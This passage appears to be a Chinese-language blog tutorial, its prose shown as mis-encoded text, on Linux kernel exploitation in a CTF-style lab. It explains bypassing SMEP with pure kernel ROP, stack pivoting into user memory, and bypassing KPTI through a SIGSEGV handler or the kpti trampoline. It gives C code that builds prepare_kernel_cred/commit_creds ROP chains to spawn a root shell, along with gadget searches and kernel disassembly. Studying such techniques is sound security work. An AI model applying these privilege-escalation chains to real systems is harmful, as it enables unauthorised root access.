<p>1.<code>CR4[bit20]</code>æ˜¯SMEPå¼€å…³, åœ¨è€ç‰ˆæœ¬å†…æ ¸ä¸Šå¯ä»¥æ”¹æˆ0ç»•è¿‡, ä½†æ˜¯åœ¨æ–°å†…æ ¸ä¸ŠCR4[bit20]è¢«æ‰äº†é’‰å­, æ‰‹åŠ¨æ”¹æˆ0ä¼šç«‹åˆ»è¢«è‡ªåŠ¨æ”¹å›1</p>
<p><img src="C:\Users\xidian\AppData\Roaming\Typora\typora-user-images\image-20241120211400284.png" alt="image-20241120211400284"></p>
<p>2.å…¨ç”¨å†…æ ¸<code>rop</code>ç»•è¿‡</p>
<p>ä¹‹å‰çš„expå¤±æ•ˆçš„åŸå› æ˜¯, ropé“¾ä¸Šçš„è¿”å›åœ°å€, æ˜¯ç”¨æˆ·ç¨‹åºä¸­çš„<code>privilege_escalation</code>å‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload[offset++] = (<span class="type">size_t</span>)&amp;privilege_escalation;</span><br></pre></td></tr></table></figure>

<p><code>smep</code>è¦æ±‚åœ¨è¿›å…¥å†…æ ¸ä¹‹å, åªèƒ½è°ƒç”¨å†…æ ¸å‡½æ•°</p>
<p>é‚£ä¹ˆæˆ‘ä»¬éœ€è¦ä½¿ç”¨çº¯ropé“¾ä»£æ›¿<code>privilege_escalation</code>çš„åŠŸèƒ½</p>
<p>é‚£ä¹ˆè¿™ä¸ª<code>rop</code>é“¾åº”è¯¥è¿™æ ·æ„é€ :</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.addr prepare_kernel_cred</span><br><span class="line">2.gadget rax-&gt;rdi</span><br><span class="line">3.addr commit_cred</span><br><span class="line">4.addr swapgs; ret</span><br><span class="line">5.iretq</span><br><span class="line">6.RIP|CS|RFLAGS|SP|SS</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">overflow</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> payload[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> offset = (<span class="number">0xa0</span> - <span class="number">0x20</span>) &gt;&gt; <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">memset</span>(payload,<span class="number">0</span>,offset*<span class="number">8</span>);</span><br><span class="line">    payload[offset++] = canary;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = addr_pop_rdi_ret;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rdi = 0</span></span><br><span class="line">    payload[offset++] = addr_prepare_kernel_cred;   <span class="comment">//init_task.creds in rax</span></span><br><span class="line">    payload[offset++] = addr_xor_edi_edi_ret;</span><br><span class="line">    payload[offset++] = addr_mov_rdi_rax_ja_pop_rbp_ret;  </span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rbp = 0   </span></span><br><span class="line">    payload[offset++] = addr_commit_creds;</span><br><span class="line">    payload[offset++] = addr_swapgs_pop_rbp_ret;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rbp = 0</span></span><br><span class="line">    payload[offset++] = addr_iret;  <span class="comment">//rbx = 0</span></span><br><span class="line">    payload[offset++] = user_rip;</span><br><span class="line">    payload[offset++] = user_cs;</span><br><span class="line">    payload[offset++] = user_rflags;</span><br><span class="line">    payload[offset++] = user_sp;</span><br><span class="line">    payload[offset++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] overflow &quot;</span>);</span><br><span class="line">    write(dev_fd,payload,offset*<span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h4 id="stack-pivoting"><a href="#stack-pivoting" class="headerlink" title="stack pivoting"></a>stack pivoting</h4><p>åœ¨åªå¼€å¯<code>smep</code>, ä¸å¼€å¯<code>smap</code>çš„æƒ…å†µä¸‹, è™½ç„¶æ§åˆ¶æµæ— æ³•ç›´æ¥æ‰§è¡Œç”¨æˆ·ç©ºé—´çš„ç¨‹åº</p>
<p>ä½†æ˜¯å¯ä»¥ç›´æ¥è®¿é—®ç”¨æˆ·ç©ºé—´çš„æ•°æ®</p>
<p>åœ¨ç”¨æˆ·ç©ºé—´ä¸Šç”³è¯·ä¸€å—å†…å­˜, ç„¶ååœ¨ropé“¾ä¸Šæ„é€ å †æ ˆè¿ç§», å°†å†…æ ¸å †æ ˆæ¬åˆ°ç”¨æˆ·ç©ºé—´ä¸­, </p>
<p>å †æ ˆè¿ç§»çš„å¥½å¤„æ˜¯:</p>
<p>1.æ‹¥æœ‰æ›´å¤§çš„ç©ºé—´</p>
<p>2.æ–°å †æ ˆå¯æ‰§è¡Œ</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯, <code>mmap</code>ç”³è¯·çš„é¡µå¿…é¡»å¯¹é½åˆ°<code>0x1000</code></p>
<p>ç”¨è¿™ä¸ª<code>gadget</code>, å®é™…ä¸Šè¿™ä¸ªé™åˆ¶å·²ç»éå¸¸ä¸¥è‹›äº†, ç”šè‡³æŸ¥<code>rsp</code>çš„<code>gadget</code>æŸ¥ä¸åˆ°, </p>
<p>æŸ¥<code>esp</code>è¿˜æ˜¯æŸ¥åˆ°äº†ä¸¤æ¡, å¹¸è¿çš„æ˜¯è¿™ä¸¤ä¸ªåœ°å€ä¹Ÿæ˜¯åœ¨å†…æ ¸ä»£ç æ®µé‡Œçš„</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/kernel-rop<span class="meta"># cat gadgets.ropgadget | grep <span class="string">&quot;mov rsp, 0x.*000 ;.*; ret&quot;</span></span></span><br><span class="line">root@Destroyer:/usr/src/kernel-rop<span class="meta"># cat gadgets.ropgadget | grep <span class="string">&quot;mov esp, 0x.*000 ;.*; ret&quot;</span></span></span><br><span class="line"><span class="number">0xffffffff8196f56a</span> : mov esp, <span class="number">0x5b000000</span> ; pop r12 ; pop rbp ; ret</span><br><span class="line"><span class="number">0xffffffff81971202</span> : xchg ebx, eax ; mov esp, <span class="number">0x5b000000</span> ; pop r12 ; pop rbp ; ret</span><br></pre></td></tr></table></figure>

<p>åœ¨<code>x86_64</code>æ±‡ç¼–ä¸­,å¯¹<code>esp</code>è¿™ç§<code>32</code>ä¸ºå¯„å­˜å™¨çš„æ¬è¿æ“ä½œ, é»˜è®¤æ˜¯æ— ç¬¦å·æ¬è¿, ä¹Ÿå°±æ˜¯è¯´</p>
<p><code>mov esp, 0x5b000000 </code>åªä¼šç»™<code>esp</code>çš„ä½<code>32</code>ä½ç½®æ•°, é«˜<code>32</code>ä½ç½®é›¶</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">alloc_fake_stack</span><span class="params">()</span>&#123;</span><br><span class="line">    fake_stack = mmap((<span class="type">char</span>*)fake_stack_addr - <span class="number">0x1000</span>,<span class="number">0x2000</span>,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> offset = <span class="number">0x1000</span>/<span class="number">8</span>;</span><br><span class="line">    fake_stack[<span class="number">0</span>] = <span class="number">0xdeadbeef</span>;		<span class="comment">//å®é™…ä¸Šå†™ä¸œè¥¿æ‰ä¼šçœŸæ­£åˆ›å»ºè¿™ä¸ªé¡µ</span></span><br><span class="line">    </span><br><span class="line">    fake_stack[offset++] = <span class="number">0</span>;</span><br><span class="line">    fake_stack[offset++] = <span class="number">0</span>;</span><br><span class="line">    fake_stack[offset++] = addr_pop_rdi_ret;</span><br><span class="line">    fake_stack[offset++] = <span class="number">0</span>;  <span class="comment">//rdi = 0</span></span><br><span class="line">    fake_stack[offset++] = addr_prepare_kernel_cred;   <span class="comment">//init_task.creds in rax</span></span><br><span class="line">    fake_stack[offset++] = addr_xor_edi_edi_ret;</span><br><span class="line">    fake_stack[offset++] = addr_mov_rdi_rax_ja_pop_rbp_ret;  </span><br><span class="line">    fake_stack[offset++] = <span class="number">0</span>;  <span class="comment">//rbp = 0   </span></span><br><span class="line">    fake_stack[offset++] = addr_commit_creds;</span><br><span class="line">    fake_stack[offset++] = addr_swapgs_pop_rbp_ret;</span><br><span class="line">    fake_stack[offset++] = <span class="number">0</span>;  <span class="comment">//rbp = 0</span></span><br><span class="line">    fake_stack[offset++] = addr_iret;  <span class="comment">//rbx = 0</span></span><br><span class="line">    fake_stack[offset++] = user_rip;</span><br><span class="line">    fake_stack[offset++] = user_cs;</span><br><span class="line">    fake_stack[offset++] = user_rflags;</span><br><span class="line">    fake_stack[offset++] = user_sp;</span><br><span class="line">    fake_stack[offset++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] overflow &quot;</span>);</span><br><span class="line">    write(dev_fd,fake_stack,offset*<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç”±äº<code>0x5b000000 </code>è¿™ç©ºé—´æ˜¯ç”¨æˆ·ç©ºé—´çš„, å› æ­¤åœ¨å¼€å¯smapä¹‹å, è¿™ç§æ–¹æ³•ä¼šå¤±æ•ˆ</p>
<h3 id="bypass-KPTI"><a href="#bypass-KPTI" class="headerlink" title="bypass KPTI"></a>bypass KPTI</h3><p><code>Kernel page-table isolation</code> , å†…æ ¸é¡µè¡¨éš”ç¦»</p>
<p>å¼€å¯kptiä¿æŠ¤å, ç”¨æˆ·æ€å’Œå†…æ ¸æ€åˆ†åˆ«ä½¿ç”¨ä¸¤å¼ é¡µè¡¨,</p>
<p><img src="https://ctf-wiki.org/pwn/linux/kernel-mode/defense/isolation/user-kernel/figure/476px-Kernel_page-table_isolation.svg.png" alt="File:Kernel page-table isolation.svg"></p>
<p>åœ¨ç”¨æˆ·æ€æ—¶,é¡µè¡¨åŒ…å«äº†å…¨éƒ¨ç”¨æˆ·ç©ºé—´ä¸å†…æ ¸ç©ºé—´çš„å¾ˆå°ä¸€éƒ¨åˆ†, ä¸»è¦æ˜¯ç³»ç»Ÿè°ƒç”¨å…¥å£</p>
<p>åœ¨å†…æ ¸æ€æ—¶,é¡µè¡¨åŒ…å«äº†å…¨éƒ¨ç”¨æˆ·ç©ºé—´ä¸å…¨éƒ¨å†…æ ¸ç©ºé—´, ä½†æ˜¯ç”¨æˆ·ç©ºé—´çš„å†…å­˜æ˜ å°„éƒ¨åˆ†å…¨éƒ½è¢«æ ‡è®°ä¸º<strong>ä¸å¯æ‰§è¡Œ</strong>(ä½†æ˜¯è¿˜æ˜¯å¯è¯»å†™çš„)</p>
<p>æ¶‰åŠåˆ°ç”¨æˆ·æ€ä¸å†…æ ¸æ€çš„è½¬æ¢æ—¶, é¦–å…ˆè¦æ›´æ¢é¡µè¡¨</p>
<p>å¦‚æœåœ¨å†…æ ¸æ€ä¸­ä¸æ›´æ¢é¡µè¡¨, ç›´æ¥<code>iret</code>è¿”å›åˆ°ç”¨æˆ·ç©ºé—´æƒ³èµ·<code>shell</code>ä¼šè¢«<code>kpti</code>å‘ç°</p>
<h4 id="signal-handleræ–¹æ³•"><a href="#signal-handleræ–¹æ³•" class="headerlink" title="signal handleræ–¹æ³•"></a>signal handleræ–¹æ³•</h4><p>è™½ç„¶ä¸æ›´æ¢é¡µè¡¨ç›´æ¥è¿”å›åˆ°ç”¨æˆ·æ€, ä¼šè¢«<code>kpti</code>å‘ç°</p>
<p>ä½†æ˜¯æ­¤æ—¶å†…æ ¸å¹¶ä¸ä¼šå´©æºƒ,è€Œæ˜¯æŠ¥å‘Šä¸€ä¸ªç”¨æˆ·æ€çš„<code>SIGSEGV</code>ä¿¡å·</p>
<blockquote>
<p>ä¸ºä»€ä¹ˆæ˜¯ç”¨æˆ·æ€çš„æ®µé”™è¯¯ä¿¡å·å‘¢?</p>
<p>å› ä¸ºæ­¤æ—¶å·²ç»<code>iret</code>è¿”å›åˆ°ç”¨æˆ·æ€äº†</p>
<p>ä½†æ˜¯é¡µè¡¨ä½¿ç”¨çš„ä»ç„¶æ˜¯<code>kpti</code>å†…æ ¸æ€é¡µè¡¨, è€Œä»è¿™ä¸ªä¹Ÿè¡¨ä¸Šåªèƒ½çœ‹å‡ºå½“å‰ç”¨æˆ·ç©ºé—´ä»£ç æ®µæ²¡æœ‰xæƒé™</p>
<p>å› æ­¤å®é™…ä¸Šç±»ä¼¼äºNXä¿æŠ¤æ—¶å°è¯•æ‰§è¡Œå †æ ˆä¸­çš„<code>shellcode</code>, æ˜¯ä¸€ä¸ªé“ç†</p>
<p>å› æ­¤æ˜¯ç”¨æˆ·æ€çš„æ®µé”™è¯¯</p>
</blockquote>
<p>è°ƒè¯•å‘ç°, å½“æ®µé”™è¯¯ä¿¡å·å‘ç”Ÿæ—¶, å·²ç»å®Œæˆäº†<code>cred</code>çš„æ›´æ¢, å¹¶ä¸”å·²ç»<code>iret</code>è¿”å›åˆ°äº†ç”¨æˆ·æ€</p>
<p>åœ¨ç”¨æˆ·æ€åˆšè¦æ‰§è¡Œçš„ç¬¬ä¸€æ¡ä»£ç è§¦å‘äº†ä¸­æ–­, å†…æ ¸ç»™ç”¨æˆ·å‘é€äº†<code>SIGSEGV</code></p>
<p>å¦‚æœæ­¤å‰ç”¨æˆ·å·²ç»æ³¨å†Œäº†ä¿¡å·å¤„ç†å‡½æ•°, <code>shell</code>ä½œä¸º<code>SIGSEGV</code>çš„å¤„ç†å‡½æ•°, å†…æ ¸ä¼šé€šè¿‡æ­£å¸¸çš„ä¸­æ–­å¤„ç†ç¨‹åºè¿”å›åˆ°ç”¨æˆ·æ€, å†…æ ¸è‡ªå·±æ­£å¸¸è¿”å›æ—¶ä¼šè‡ªåŠ¨åˆ‡æ¢é¡µè¡¨, å› æ­¤ç»è¿‡è¿™æ¡è·¯è¿”å›åˆ°ç”¨æˆ·æ€å°±æ­£å¸¸äº†, å¹¶ä¸”æ§åˆ¶æµä¹Ÿç»™åˆ°äº†shellå‡½æ•°ä¸­</p>
<p>å°±å¯ä»¥èµ·ä¸€ä¸ª<code>root shell</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    signal(SIGSEGV, spawn_shell);</span><br><span class="line">    save_state();   <span class="comment">//ä¿å­˜è¿›å…¥å†…æ ¸ä¹‹å‰çš„ç”¨æˆ·æ€ä¸Šä¸‹æ–‡</span></span><br><span class="line">    open_dev();     <span class="comment">//æ‰“å¼€è®¾å¤‡</span></span><br><span class="line">    leak_canary();  <span class="comment">//æ³„éœ²canary</span></span><br><span class="line">    overflow();     <span class="comment">//æº¢å‡º,ç»•è¿‡canary,æ„é€ ropé“¾</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[!] should never be reached&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="kpti-trampolineæ–¹æ³•"><a href="#kpti-trampolineæ–¹æ³•" class="headerlink" title="kpti trampolineæ–¹æ³•"></a>kpti trampolineæ–¹æ³•</h4><p>åŸºäºè¿™æ ·ä¸€ç‚¹è€ƒè™‘:</p>
<p>å†…æ ¸æ­£å¸¸çš„ç³»ç»Ÿè°ƒç”¨å¦‚æœèƒ½èµ°æŸæ¡è·¯æˆåŠŸç€é™†ç”¨æˆ·æ€,é‚£ä¹ˆ<strong>æˆ‘ä»¬ä¹Ÿå¯ä»¥å€Ÿé“</strong></p>
<p>è¿™ä¸ªé“å°±å«<code>kpti trampoline</code>, è¿™é“å¯ä»¥ <code>æ›´æ¢é¡µè¡¨, swapgs, iretq</code></p>
<blockquote>
<p>trampolineæ˜¯æŒ‡å†…æ ¸æ€è¿”å›åˆ°ç”¨æˆ·æ€çš„ç¼“å†², å› æ­¤å«åšè¹¦åºŠ</p>
</blockquote>
<p>ä½äºå†…æ ¸å‡½æ•°<code>	swapgs_restore_regs_and_return_to_usermode </code>ä¸­</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//@ Linux-5.14/arch/x86/entry/entry_64.S</span></span><br><span class="line">SYM_CODE_START_LOCAL(common_interrupt_return)</span><br><span class="line">SYM_INNER_LABEL(swapgs_restore_regs_and_return_to_usermode, SYM_L_GLOBAL)</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_ENTRY</span></span><br><span class="line">	<span class="comment">/* Assert that pt_regs indicates user mode. */</span></span><br><span class="line">	testb	$<span class="number">3</span>, CS(%rsp)</span><br><span class="line">	jnz	<span class="number">1f</span></span><br><span class="line">	ud2</span><br><span class="line"><span class="number">1</span>:</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	POP_REGS pop_rdi=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * The stack is now user RDI, orig_ax, RIP, CS, EFLAGS, RSP, SS.</span></span><br><span class="line"><span class="comment">	 * Save old stack pointer and switch to trampoline stack.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	movq	%rsp, %rdi</span><br><span class="line">	movq	PER_CPU_VAR(cpu_tss_rw + TSS_sp0), %rsp</span><br><span class="line">	UNWIND_HINT_EMPTY</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Copy the IRET frame to the trampoline stack. */</span></span><br><span class="line">	pushq	<span class="number">6</span>*<span class="number">8</span>(%rdi)	<span class="comment">/* SS */</span></span><br><span class="line">	pushq	<span class="number">5</span>*<span class="number">8</span>(%rdi)	<span class="comment">/* RSP */</span></span><br><span class="line">	pushq	<span class="number">4</span>*<span class="number">8</span>(%rdi)	<span class="comment">/* EFLAGS */</span></span><br><span class="line">	pushq	<span class="number">3</span>*<span class="number">8</span>(%rdi)	<span class="comment">/* CS */</span></span><br><span class="line">	pushq	<span class="number">2</span>*<span class="number">8</span>(%rdi)	<span class="comment">/* RIP */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Push user RDI on the trampoline stack. */</span></span><br><span class="line">	pushq	(%rdi)</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * We are on the trampoline stack.  All regs except RDI are live.</span></span><br><span class="line"><span class="comment">	 * We can do future final exit work right here.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	STACKLEAK_ERASE_NOCLOBBER</span><br><span class="line"></span><br><span class="line">	SWITCH_TO_USER_CR3_STACK scratch_reg=%rdi</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Restore RDI. */</span></span><br><span class="line">	popq	%rdi</span><br><span class="line">	SWAPGS</span><br><span class="line">	INTERRUPT_RETURN</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ ‡å·1è¿™éƒ¨åˆ†æ˜¯æ­£æ–‡</p>
<p>åœ¨è¿™éƒ¨åˆ†ä¸­,é¦–å…ˆ<code>POP_REGS pop_rdi=0</code>è¿™æ˜¯ä¸ªå®, å®ƒä¼šä»æ ˆä¸Šå¼¹å‡ºä¸€ç³»åˆ—å€¼äº¤ç»™å¯„å­˜å™¨</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">//@Linux5.14/arch/x86/entry/calling.h</span><br><span class="line">.macro POP_REGS pop_rdi=1 skip_r11rcx=0</span><br><span class="line">	popq %r15</span><br><span class="line">	popq %r14</span><br><span class="line">	popq %r13</span><br><span class="line">	popq %r12</span><br><span class="line">	popq %rbp</span><br><span class="line">	popq %rbx</span><br><span class="line">	.if \skip_r11rcx</span><br><span class="line">	popq %rsi</span><br><span class="line">	.else</span><br><span class="line">	popq %r11</span><br><span class="line">	.endif</span><br><span class="line">	popq %r10</span><br><span class="line">	popq %r9</span><br><span class="line">	popq %r8</span><br><span class="line">	popq %rax</span><br><span class="line">	.if \skip_r11rcx</span><br><span class="line">	popq %rsi</span><br><span class="line">	.else</span><br><span class="line">	popq %rcx</span><br><span class="line">	.endif</span><br><span class="line">	popq %rdx</span><br><span class="line">	popq %rsi</span><br><span class="line">	.if \pop_rdi</span><br><span class="line">	popq %rdi</span><br><span class="line">	.endif</span><br><span class="line">.endm</span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥rdiæŒ‡å‘æ—§å †æ ˆ, ä»gsæ®µæ‹¿å‡ºrsp0äº¤ç»™rsp</p>
<p>ç„¶åæŠŠè€å †æ ˆä¸Šä¿å­˜çš„ç”¨æˆ·ä¸Šä¸‹æ–‡å‹åˆ°æ–°å †æ ˆé‡Œ</p>
<p>ç„¶åæ›´æ¢é¡µè¡¨</p>
<p>ç„¶åswapgs</p>
<p>ç„¶åiret</p>
<p>å®é™…ä¸Šæ­¤æ—¶iretä½¿ç”¨çš„å †æ ˆ, å·²ç»æ˜¯æ–°å †æ ˆäº†,ä¸æ˜¯è€å †æ ˆ</p>
</blockquote>
<p>å…·ä½“å¹²äº†å•¥å¯ä»¥çœ‹åæ±‡ç¼–</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="meta"># cat /proc/kallsyms  | grep swapgs_restore_regs_and_return_to_usermode</span></span><br><span class="line">ffffffff81200f10 T swapgs_restore_regs_and_return_to_usermode</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#POP_REGSéƒ¨åˆ†çœç•¥</span><br><span class="line"></span><br><span class="line">  0xffffffff81200f26 &lt;_stext+2101030&gt;: mov    rdi,rsp</span><br><span class="line">  0xffffffff81200f29 &lt;_stext+2101033&gt;: mov    rsp,QWORD PTR gs:0x6004</span><br><span class="line">  0xffffffff81200f32 &lt;_stext+2101042&gt;: push   QWORD PTR [rdi+0x30]		;ç”¨æˆ·ss</span><br><span class="line">  0xffffffff81200f35 &lt;_stext+2101045&gt;: push   QWORD PTR [rdi+0x28]		;ç”¨æˆ·rsp</span><br><span class="line">  0xffffffff81200f38 &lt;_stext+2101048&gt;: push   QWORD PTR [rdi+0x20]		;ç”¨æˆ·eflags</span><br><span class="line">  0xffffffff81200f3b &lt;_stext+2101051&gt;: push   QWORD PTR [rdi+0x18]		;ç”¨æˆ·cs</span><br><span class="line">  0xffffffff81200f3e &lt;_stext+2101054&gt;: push   QWORD PTR [rdi+0x10]		;ç”¨æˆ·rip</span><br><span class="line">  0xffffffff81200f41 &lt;_stext+2101057&gt;: push   QWORD PTR [rdi]			;è€æ ˆé¡¶</span><br><span class="line">  0xffffffff81200f43 &lt;_stext+2101059&gt;: push   rax</span><br><span class="line">  0xffffffff81200f44 &lt;_stext+2101060&gt;: xchg   ax,ax</span><br><span class="line">  0xffffffff81200f46 &lt;_stext+2101062&gt;: mov    rdi,cr3</span><br><span class="line">  0xffffffff81200f49 &lt;_stext+2101065&gt;: jmp    0xffffffff81200f7f &lt;_stext+2101119&gt;</span><br><span class="line">  </span><br><span class="line">  0xffffffff81200f7f &lt;_stext+2101119&gt;: or     rdi,0x1000			#èœœæ±æ“ä½œ</span><br><span class="line">  0xffffffff81200f86 &lt;_stext+2101126&gt;: mov    cr3,rdi</span><br><span class="line">  0xffffffff81200f89 &lt;_stext+2101129&gt;: pop    rax</span><br><span class="line">  0xffffffff81200f8a &lt;_stext+2101130&gt;: pop    rdi</span><br><span class="line">  0xffffffff81200f8b &lt;_stext+2101131&gt;: swapgs</span><br><span class="line">  0xffffffff81200f8e &lt;_stext+2101134&gt;: nop    DWORD PTR [rax]</span><br><span class="line">  0xffffffff81200f91 &lt;_stext+2101137&gt;: jmp    0xffffffff81200fc0 &lt;_stext+2101184&gt;</span><br><span class="line">  </span><br><span class="line">  0xffffffff81200fc0 &lt;_stext+2101184&gt;: test   BYTE PTR [rsp+0x20],0x4</span><br><span class="line">  0xffffffff81200fc5 &lt;_stext+2101189&gt;: jne    0xffffffff81200fc9 &lt;_stext+2101193&gt;	#è¿™ä¸ªè°ƒè¯•è§‚å¯Ÿä¸ä¼šè·³</span><br><span class="line">  0xffffffff81200fc7 &lt;_stext+2101191&gt;: iretq</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæœ‰ä¸€ä¸ªå¾ˆè¿·çš„æ“ä½œ, æŠŠ<code>cr3</code>é‡Œé¢çš„é¡µè¡¨åœ°å€æ‹¿å‡ºæ¥, æˆ–äº†ä¸€ä¸ª<code>0x1000</code>å†æ”¾å›å», å°±å®Œæˆäº†å†…æ ¸æ€-ç”¨æˆ·æ€é¡µè¡¨çš„æ›´æ¢, è¿™æ˜¯å› ä¸ºè¿™ä¿©é¡µè¡¨åœ°å€è¿˜çœŸå°±æ˜¯è¿™æ ·æŒ¨ç€å­˜æ”¾çš„, è¿™å“¥ä¿©è¢«ç§°ä¸ºä¸€ä¸ª<code>CR3 Pair</code></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/a99b0d0eef40d94aa386ee0d903b5a64.png" alt="CR3 Pair"></p>
<blockquote>
<p>è¿™ç§ä¼™ä¼´å½¢å¼è¿˜è§äºå®Œå…¨äºŒå‰æ ‘:</p>
<p>å¦‚æœæ ¹ä»1å¼€å§‹ç¼–å·, é‚£ä¹ˆå…¶ä»–èŠ‚ç‚¹çš„ç¼–å·å¼‚æˆ–1å°±æ˜¯å…¶å…„å¼ŸèŠ‚ç‚¹</p>
